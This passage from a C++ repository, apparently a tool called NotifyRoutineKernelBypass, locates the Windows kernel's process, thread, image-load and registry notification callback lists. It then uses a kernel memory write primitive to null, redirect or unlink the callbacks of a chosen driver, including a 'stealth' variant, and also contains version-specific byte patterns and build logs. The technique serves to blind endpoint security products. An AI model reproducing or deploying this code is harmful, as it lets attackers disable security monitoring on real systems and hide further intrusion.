	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

notifyRoutine::notifyRoutine(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
}

DWORD64 notifyRoutine::GetFunctionAddress(LPCSTR function) {
	HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
	DWORD64 Offset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, function)) - reinterpret_cast<DWORD64>(Ntoskrnl);
	DWORD64 address = (DWORD64) this->lpNtosBase + Offset;
	FreeLibrary(Ntoskrnl);
	Log("[+] %s address: %p\n", function, address);
	return address;
}

DWORD64  notifyRoutine::PatternSearch(DWORD64 start, DWORD64 end, DWORD64 pattern) {
	int range = end - start;
	for (int i = 0; i < range; i++) {

		DWORD64 contents = NULL;
		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)start + i,
			&contents,
			sizeof(contents)
		);
		if (!b) return FALSE;

		if (contents == pattern) {
			return start + i;
		}
	}
	return 0;
}

BOOL notifyRoutine::Restore() {
	BOOL b = false;
	if (patchCallbackMap.size() > 0) {
		for (const auto& entry : patchCallbackMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	if (patchLinksMap.size() > 0) {
		for (const auto& entry : patchLinksMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	return b;
}

TCHAR* notifyRoutine::FindDriver(DWORD64 address) {

	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 diff[3][200];
	TCHAR szDriver[1024];
	static TCHAR result[2048];  // Make sure it's large enough for the output

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		int n = sizeof(drivers) / sizeof(drivers[0]);
		cDrivers = cbNeeded / sizeof(drivers[0]);
		int narrow = 0;
		int c = 0;
		for (i = 0; i < cDrivers; i++) {
			//we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
			if (address > (DWORD64)drivers[i]) {
				diff[0][c] = address;
				diff[1][c] = address - (DWORD64)drivers[i];
				diff[2][c] = (DWORD64)drivers[i];
				c++;
			}
		}
	}
	//cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
	int k = 0;
	DWORD64 temp = diff[1][0];
	for (k = 0; k < cDrivers; k++) {
		if ((temp > diff[1][k]) && (diff[0][k] == address)) {
			temp = diff[1][k];

		}
	}

	if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {

		// Combine address, szDriver, and temp into a formatted string safely
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("%p [%s + 0x%llx]\n"),
			(void*)address, szDriver, temp);

		std::cout << "[+] " << std::hex << address << " [";
		std::wcout << szDriver << " + 0x";
		std::cout << std::hex << (int)temp;
		std::cout << "]" << std::endl;
	}
	else {
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("Could not resolve driver for %p\n"),
			(void*)address);
	}

	return result;
}

void notifyRoutine::findregistrycallbackroutines(DWORD64 remove) {
	//UCHAR PTRN_W10_Reg[] =	{0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x85, 0xc0, 0x0f, 0x84};
	//so retrieving this one is different from proc/img/thread. We need to find the undocumented callbacklisthead. The callbacklisthead contains a pointer to the registry notification callback routine. 
	//At offset 0x28 is the address of the callback function.

	PLIST_ENTRY pEntry;
	Offsets offsets = getVersionOffsets();
	DWORD64 CmUnRegisterCallbackAddress = GetFunctionAddress("CmUnRegisterCallback");
	DWORD64 CmUnregisterMachineHiveLoadedNotification = GetFunctionAddress("CmUnregisterMachineHiveLoadedNotification");
	DWORD64 patternaddress = PatternSearch(CmUnRegisterCallbackAddress, CmUnregisterMachineHiveLoadedNotification, offsets.registry);
	DWORD offset;
	
	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x09,
		&offset,
		sizeof(offset)
	);

	const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x09 + 0x04;

	Log("[+] Callbacklisthead: %p", callbacklisthead);

	DWORD64 EntryToRemove;
	
	b = this->objMemHandler->VirtualRead(
		(DWORD64)callbacklisthead,
		&EntryToRemove,
		sizeof(EntryToRemove)
	);

	int i = 0;

	while (EntryToRemove != callbacklisthead && i < 64) {
		DWORD64 callback;
		
		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove + 0x28,
			&callback,
			sizeof(callback)
		);

		DWORD64 AddressToOverWrite = EntryToRemove + 0x28;

		FindDriver(callback);

		if (callback == remove) {
			//Method 1 => Overwrite the callback function with anoter KCFG Compliant Function that just returns
			const DWORD64 KeGetCurrentIrql = GetFunctionAddress("KeGetCurrentIrql"); // it just return
			Log("Overwriting callback at address %p containing %p to %p", AddressToOverWrite, callback, KeGetCurrentIrql);
			// For Restoration Later, we keep old and new value
			patchCallbackMap[AddressToOverWrite] = std::make_pair(callback, KeGetCurrentIrql);
			// WRITE PRIMITIVE
			b = this->objMemHandler->WriteMemoryDWORD64(
				(DWORD64)AddressToOverWrite,
				(DWORD64)KeGetCurrentIrql
			);
		}

		DWORD64 NextEntryToRemove;

		b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove,
			&NextEntryToRemove,
			sizeof(NextEntryToRemove)
		);

		EntryToRemove = NextEntryToRemove;

		i++;
	}
}

void notifyRoutine::unlinkregistrycallbackroutines(DWORD64 remove) {
	//UCHAR PTRN_W10_Reg[] =	{0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x85, 0xc0, 0x0f, 0x84};
	//so retrieving this one is different from proc/img/thread. We need to find the undocumented callbacklisthead. The callbacklisthead contains a pointer to the registry notification callback routine. 
	//At offset 0x28 is the address of the callback function.

	PLIST_ENTRY pEntry;
	Offsets offsets = getVersionOffsets();
	DWORD64 CmUnRegisterCallbackAddress = GetFunctionAddress("CmUnRegisterCallback");
	DWORD64 CmUnregisterMachineHiveLoadedNotification = GetFunctionAddress("CmUnregisterMachineHiveLoadedNotification");
	DWORD64 patternaddress = PatternSearch(CmUnRegisterCallbackAddress, CmUnregisterMachineHiveLoadedNotification, offsets.registry);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x09,
		&offset,
		sizeof(offset)
	);

	const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x09 + 0x04;

	Log("[+] Callbacklisthead: %p", callbacklisthead);

	DWORD64 EntryToRemove;

	b = this->objMemHandler->VirtualRead(
		(DWORD64)callbacklisthead,
		&EntryToRemove,
		sizeof(EntryToRemove)
	);

	int i = 0;

	while (EntryToRemove != callbacklisthead && i < 64) {

		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove + 0x28,
			&callback,
			sizeof(callback)
		);

		DWORD64 AddressToOverWrite = EntryToRemove + 0x28;
		FindDriver(callback);

		if (callback == remove) {
			// Method 2 -> Unlinking
			DWORD64 nextNodeAddress;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)EntryToRemove + offsetof(LIST_ENTRY, Flink),
				&nextNodeAddress,
				sizeof(nextNodeAddress)
			);
			
			DWORD64 prevNodeAddress;
			
			b = this->objMemHandler->VirtualRead(
				(DWORD64)EntryToRemove + offsetof(LIST_ENTRY, Blink),
				&prevNodeAddress,
				sizeof(prevNodeAddress)
			);

			// Store the old and new values in the map
			DWORD64 BlinkToRestore;
			
			b = this->objMemHandler->VirtualRead(
				(DWORD64)nextNodeAddress + offsetof(LIST_ENTRY, Blink),
				&BlinkToRestore,
				sizeof(BlinkToRestore)
			);

			DWORD64 FlinkToRestore;
			
			b = this->objMemHandler->VirtualRead(
				(DWORD64)prevNodeAddress + offsetof(LIST_ENTRY, Flink),
				&FlinkToRestore,
				sizeof(FlinkToRestore)
			);

			patchLinksMap[nextNodeAddress + offsetof(LIST_ENTRY, Blink)] = std::make_pair(BlinkToRestore, prevNodeAddress);
			patchLinksMap[prevNodeAddress + offsetof(LIST_ENTRY, Flink)] = std::make_pair(FlinkToRestore, nextNodeAddress);

			Log("Overwriting ToRemove->Flink->Blink at address %p containing %p to %p", nextNodeAddress + offsetof(LIST_ENTRY, Blink), BlinkToRestore, prevNodeAddress);
			Log("Overwriting ToRemove->Blink->Flink at address %p containing %p to %p", prevNodeAddress + offsetof(LIST_ENTRY, Flink), FlinkToRestore, nextNodeAddress);
			
			b = this->objMemHandler->WriteMemoryDWORD64(
				(DWORD64)nextNodeAddress + offsetof(LIST_ENTRY, Blink),
				(DWORD64)prevNodeAddress
			);

			b = this->objMemHandler->WriteMemoryDWORD64(
				(DWORD64)prevNodeAddress + +offsetof(LIST_ENTRY, Flink),
				(DWORD64)nextNodeAddress
			);
		}

		DWORD64 NextEntryToRemove;

		b = this->objMemHandler->VirtualRead(
			(DWORD64)EntryToRemove,
			&NextEntryToRemove,
			sizeof(NextEntryToRemove)
		);

		EntryToRemove = NextEntryToRemove;

		i++;
	}

}

void notifyRoutine::findimgcallbackroutine(DWORD64 remove) {

	Offsets offsets = getVersionOffsets();

	DWORD64 RtlAppendStringToString = GetFunctionAddress("RtlAppendStringToString");
	DWORD64 IoInitializeMiniCompletionPacket = GetFunctionAddress("IoInitializeMiniCompletionPacket");

	DWORD64 patternaddress = PatternSearch(RtlAppendStringToString, IoInitializeMiniCompletionPacket, offsets.image);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x04,
		&offset,
		sizeof(offset)
	);

	const DWORD64 PspLoadImageNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x04 + 0x04;
	
	Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
	Log("[+] Enumerating image load callbacks");

	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)PspLoadImageNotifyRoutineAddress + (i * 8),
			&callback,
			sizeof(callback)
		);

		DWORD64 OldValue = callback;

		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes

			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64) callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			FindDriver(cbFunction);

			if (cbFunction == remove) {
				Log("Removing callback Entry at address %p containing %p to %p", PspLoadImageNotifyRoutineAddress + (i * 8), OldValue, 0x0000000000000000);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[PspLoadImageNotifyRoutineAddress + (i * 8)] = std::make_pair(OldValue, 0x0000000000000000);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)PspLoadImageNotifyRoutineAddress + (i * 8),
					(DWORD64)0x0000000000000000
				);
			}
		}

	}

}

void notifyRoutine::findthreadcallbackroutine(DWORD64 remove) {
	// the function is PspSetCreateThreadNotifyRoutine
	Offsets offsets = getVersionOffsets();

	const DWORD64 PsRemoveCreateThreadNotifyRoutine = GetFunctionAddress("PsSetLoadImageNotifyRoutine");
	const DWORD64 PsRemoveLoadImageNotifyRoutine = GetFunctionAddress("PsTlsAlloc");

	DWORD64 patternaddress = PatternSearch(PsRemoveCreateThreadNotifyRoutine, PsRemoveLoadImageNotifyRoutine, offsets.thread);
	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x04,
		&offset,
		sizeof(offset)
	);

	DWORD64 PspCreateThreadNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x04 + 0x04;
	
	Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
	Log("[+] Enumerating thread creation callbacks");

	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)PspCreateThreadNotifyRoutineAddress + (i * 8),
			&callback,
			sizeof(callback)
		);

		DWORD64 OldValue = callback;
		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			FindDriver(cbFunction);
			if (cbFunction == remove) {
				Log("Removing callback Entry at address %p containing %p to %p", PspCreateThreadNotifyRoutineAddress + (i * 8), OldValue, 0x0000000000000000);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[PspCreateThreadNotifyRoutineAddress + (i * 8)] = std::make_pair(OldValue, 0x0000000000000000);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)PspCreateThreadNotifyRoutineAddress + (i * 8),
					(DWORD64)0x0000000000000000
				);
			}
		}

	}
}

void notifyRoutine::findprocesscallbackroutine(DWORD64 remove) {

	//we search the memory between PoRegisterCoalescingCallback and EtwWriteEndScenario for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
	Offsets offsets = getVersionOffsets();
	const DWORD64 IoDeleteSymbolicLink = GetFunctionAddress("IoDeleteSymbolicLink");
	const DWORD64 RtlDestroyHeap = GetFunctionAddress("RtlDestroyHeap");

	//the address returned by the patternsearch is just below the offsets. 
	DWORD64 patternaddress = PatternSearch(IoDeleteSymbolicLink, RtlDestroyHeap, offsets.process);
	Log("[+] patternaddress: %p", patternaddress);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x0f,
		&offset,
		sizeof(offset)
	);

	//so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x0f + 0x04;

	Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
	Log("[+] Enumerating process creation callbacks");

	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)(PspCreateProcessNotifyRoutineAddress + (i * 8)),
			&callback,
			sizeof(callback)
		);

		DWORD64 OldValue = callback;
		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
			
			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			FindDriver(cbFunction);

			if (cbFunction == remove) {
				Log("Removing callback Entry at address %p containing %p to %p", PspCreateProcessNotifyRoutineAddress + (i * 8), OldValue, 0x0000000000000000);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[PspCreateProcessNotifyRoutineAddress + (i * 8)] = std::make_pair(OldValue, 0x0000000000000000);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)PspCreateProcessNotifyRoutineAddress + (i * 8),
					(DWORD64)0x0000000000000000
				);
			}
		}

	}
}

// Overwriting the callback Function inside the callback entry at offset 0x08 instead of Nulling the whole callback entry
void notifyRoutine::findprocesscallbackroutinestealth(DWORD64 remove) {

	//we search the memory between IoDeleteSymbolicLink and RtlDestroyHeap for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
	Offsets offsets = getVersionOffsets();
	const DWORD64 PoRegisterCoalescingCallback = GetFunctionAddress("IoDeleteSymbolicLink");
	const DWORD64 EtwWriteEndScenario = GetFunctionAddress("RtlDestroyHeap");

	//the address returned by the patternsearch is just below the offsets. 
	DWORD64 patternaddress = PatternSearch(PoRegisterCoalescingCallback, EtwWriteEndScenario, offsets.process);
	Log("[+] patternaddress: %p", patternaddress);

	DWORD offset;

	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)patternaddress - 0x0f,
		&offset,
		sizeof(offset)
	);

	//so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
	DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x0f + 0x04;

	Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
	Log("[+] Enumerating process creation callbacks");
	int i = 0;
	for (i; i < 64; i++) {
		DWORD64 callback;

		BOOL b = this->objMemHandler->VirtualRead(
			(DWORD64)PspCreateProcessNotifyRoutineAddress + (i * 8),
			&callback,
			sizeof(callback)
		);

		if (callback != NULL) {//only print actual callbacks
			callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
			DWORD64 cbFunction;

			BOOL b = this->objMemHandler->VirtualRead(
				(DWORD64)callback,
				&cbFunction,
				sizeof(cbFunction)
			);

			TCHAR* output = FindDriver(cbFunction);
			if (cbFunction == remove) {
				const DWORD64 KeGetCurrentIrql = GetFunctionAddress("KeGetCurrentIrql"); // it just return IRQL // KCFG Compliant Function
				Log("Removing callback Function at address %p containing %p to %p", callback, cbFunction, KeGetCurrentIrql);
				// For Restoration Later, we keep old and new value
				patchCallbackMap[callback] = std::make_pair(cbFunction, KeGetCurrentIrql);
				// WRITE PRIMITIVE
				b = this->objMemHandler->WriteMemoryDWORD64(
					(DWORD64)callback,
					(DWORD64)KeGetCurrentIrql
				);
			}
		}

	}
}

notifyRoutine::~notifyRoutine()
{
}

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/notifyRoutine.h`:

```h
#pragma once
#define ASSERT_SZ( x, y ) static_assert(sizeof(x) == y, "incorrect size for " #x);

// begin usermode defs
#include <Windows.h>
#include <winternl.h>
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/notifyRoutineUtil.h`:

```h
// CallbackRemover.h
#pragma once

#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>
#include <tchar.h>
#include <map>
#include "MemHandler.h"
#include <tlhelp32.h>

#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))

// Structure Definitions
struct Offsets {
    DWORD64 process;
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};
inline Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = sizeof(value);

    if (RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize) != ERROR_SUCCESS) {
        wprintf(L"[!] Failed to retrieve Windows version\n");
        return { 0, 0, 0, 0 };
    }

    wprintf(L"[+] Windows Version %s Found\n", value);
    int winVer = _wtoi(value);

    switch (winVer) {
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2009:
        return { 0x7340fe8341f63345, 0x8d48d68b48c03345, 0x48d90c8d48c03345, 0x4024448948f88b48 };
    default:
        wprintf(L"[!] Version Offsets Not Found!\n");
        return { 0, 0, 0, 0 };
    }
}

class notifyRoutine
{
public:
	notifyRoutine(MemHandler* objMemHandler);
	~notifyRoutine();
	PVOID lpNtosBase = { 0 };
	DWORD64 GetFunctionAddress(LPCSTR function);
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchCallbackMap;
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchLinksMap;
	BOOL Restore();
	DWORD64 PatternSearch(DWORD64 start, DWORD64 end, DWORD64 pattern);
	void findregistrycallbackroutines(DWORD64 remove);
	void unlinkregistrycallbackroutines(DWORD64 remove);
	void findimgcallbackroutine(DWORD64 remove);
	void findthreadcallbackroutine(DWORD64 remove);
	void findprocesscallbackroutine(DWORD64 remove);
	void findprocesscallbackroutinestealth(DWORD64 remove);
	TCHAR* FindDriver(DWORD64 address);
private:
	ULONG ulNumFrames;
	PVOID ResolveDriverBase(const wchar_t* strDriverName);
	MemHandler* objMemHandler;
};
```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by FileNetworkKernelBypass.rc

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/CL.command.1.tlog`:

```tlog
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINE.CPP
/c /Zi /nologo /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D NDEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /MD /GS /Gy /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"X64\RELEASE\\" /Fd"X64\RELEASE\VC143.PDB" /external:W3 /Gd /TP /FC C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINE.CPP
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.CPP
/c /Zi /nologo /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D NDEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /MD /GS /Gy /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"X64\RELEASE\\" /Fd"X64\RELEASE\VC143.PDB" /external:W3 /Gd /TP /FC C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.CPP
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMORY.CPP
/c /Zi /nologo /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D NDEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /MD /GS /Gy /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"X64\RELEASE\\" /Fd"X64\RELEASE\VC143.PDB" /external:W3 /Gd /TP /FC C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMORY.CPP
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS.CPP
/c /Zi /nologo /W3 /WX- /diagnostics:column /sdl /O2 /Oi /GL /D NDEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /MD /GS /Gy /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"X64\RELEASE\\" /Fd"X64\RELEASE\VC143.PDB" /external:W3 /Gd /TP /FC C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS.CPP

```

`NotifyRoutineKernelBypass/NotifyRoutineKernelBypass/x64/Release/NotifyRo.973cd09d.tlog/CL.read.1.tlog`:

```tlog
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINE.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEUTIL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINDOWS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINAPIFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINPACKAGEFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDKDDKVER.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EXCPT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\SAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CONCURRENCYSAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VADEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDARG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\MINWINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_STRICT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_UNDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDV_DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KERNELSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BASETSD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\GUIDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMCPY_S.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\ERRNO.H
